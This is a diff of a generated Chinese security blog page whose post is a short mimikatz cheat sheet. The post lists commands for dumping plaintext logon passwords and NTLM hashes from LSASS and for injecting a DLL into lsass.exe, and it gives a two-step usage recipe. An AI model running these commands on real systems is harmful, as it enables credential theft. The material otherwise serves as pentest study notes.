@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">310</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">328</span> / Reading time: <span class="post-count">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -396,9 +396,9 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="mimikatz常用命令"><a href="#mimikatz常用命令" class="headerlink" title="mimikatz常用命令"></a>mimikatz常用命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system::user        //查看当前登录的用户</span><br><span class="line">process::list       //列出进程</span><br><span class="line">process::stop processname //结束进程（有些进程结束不了，即使权限够大）</span><br><span class="line">process::suspend  processname //暂停进程</span><br><span class="line">process::modules      //列出系统核心模块和其所在的物理路径</span><br><span class="line">service::list       //列出系统服务</span><br><span class="line">service::stop(start) service_name   //停止（开启）服务</span><br><span class="line">privilege::list   //列出系统权限列表</span><br><span class="line">privilege::debug   /提升权限 （执行这条命令得有足够的权限）</span><br><span class="line">nogpo::cmd       //打开cmd</span><br><span class="line">nogpo::regedit   //打开注册表</span><br><span class="line">ts::sessions     //显示当前回话</span><br><span class="line">ts::processes    //显示当前进程及其PID</span><br><span class="line">sekurlsa::logonpasswords   //获取当前在线用户的明文密码（需要高权限运行）</span><br><span class="line">lsadump::lsa /patch       //获取当前此计算机存在过用户的NTLMHASH</span><br><span class="line">inject::process lsass.exe &apos;路径&apos; sekurlsa.dll //进程注入（如果用1.0版本获取hash的时候发现sekurlsa模块存在，就可以用进程注入一个dll文件，然后在获取hash）</span><br></pre></td></tr></table></figure>
+        <h1 id="mimikatz常用命令"><a href="#mimikatz常用命令" class="headerlink" title="mimikatz常用命令"></a>mimikatz常用命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">system::user        //查看当前登录的用户</span><br><span class="line">process::list       //列出进程</span><br><span class="line">process::stop processname //结束进程（有些进程结束不了，即使权限够大）</span><br><span class="line">process::suspend  processname //暂停进程</span><br><span class="line">process::modules      //列出系统核心模块和其所在的物理路径</span><br><span class="line">service::list       //列出系统服务</span><br><span class="line">service::stop(start) service_name   //停止（开启）服务</span><br><span class="line">privilege::list   //列出系统权限列表</span><br><span class="line">privilege::debug   /提升权限 （执行这条命令得有足够的权限）</span><br><span class="line">nogpo::cmd       //打开cmd</span><br><span class="line">nogpo::regedit   //打开注册表</span><br><span class="line">ts::sessions     //显示当前回话</span><br><span class="line">ts::processes    //显示当前进程及其PID</span><br><span class="line">sekurlsa::logonpasswords   //获取当前在线用户的明文密码（需要高权限运行）</span><br><span class="line">lsadump::lsa /patch       //获取当前此计算机存在过用户的NTLMHASH</span><br><span class="line">inject::process lsass.exe &apos;路径&apos; sekurlsa.dll //进程注入（如果用1.0版本获取hash的时候发现sekurlsa模块存在，就可以用进程注入一个dll文件，然后在获取hash）</span><br></pre></td></tr></table></figure>
 <h1 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h1><p>1.首先以管理员身份运行mimikatz.exe</p>
-<p>2.运行下面指令，即可得到当前内网中的所有密码。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug           //提升权限</span><br><span class="line">sekurlsa::logonpasswords   //抓取密码</span><br></pre></td></tr></table></figure></p>
+<p>2.运行下面指令，即可得到当前内网中的所有密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug           //提升权限</span><br><span class="line">sekurlsa::logonpasswords   //抓取密码</span><br></pre></td></tr></table></figure></p>
 <p>参考链接：</p>
 <p><a href="http://www.cnblogs.com/pursuitofacm/p/6706841.html" target="_blank" rel="noopener">http://www.cnblogs.com/pursuitofacm/p/6706841.html</a></p>
 <p><a href="https://blog.csdn.net/pyphrb/article/details/52051321" target="_blank" rel="noopener">https://blog.csdn.net/pyphrb/article/details/52051321</a></p>
@@ -936,38 +936,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 29
@@ -980,20 +948,6 @@ top:50vh;
     
     
     
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
@@ -1129,6 +1083,29 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">05/18</span><a class="archive-post-title" href= "/2018/05/18/rsa/" >Crypto_RSA算法总结</a>
         </li>
@@ -1145,9 +1122,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
     
